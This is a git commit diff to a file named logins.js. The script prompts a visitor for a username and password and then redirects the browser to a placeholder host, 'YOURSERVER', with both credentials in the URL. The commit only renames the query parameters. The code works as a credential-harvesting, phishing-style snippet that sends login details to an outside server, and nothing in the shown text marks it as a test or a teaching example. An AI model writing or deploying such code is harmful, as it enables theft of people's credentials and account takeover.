8ead9012aac6787456d06318b795b4f84b7e9f20
razi8 <65502406+razi8@users.noreply.github.com>
2026-05-25 04:02:43 +0700

    Update logins.js

--- logins.js
+++ logins.js
@@ -2,6 +2,6 @@ const username = prompt("enter username:");
 const password = prompt("enter password:");
 
 if (username && password) {
-  const url = "https://YOURSERVER/?"+encodeURIComponent(username)+"&"+encodeURIComponent(password);
+  const url = "https://YOURSERVER/?username="+encodeURIComponent(username)+"&password="+encodeURIComponent(password);
   window.location.href = url;
 }
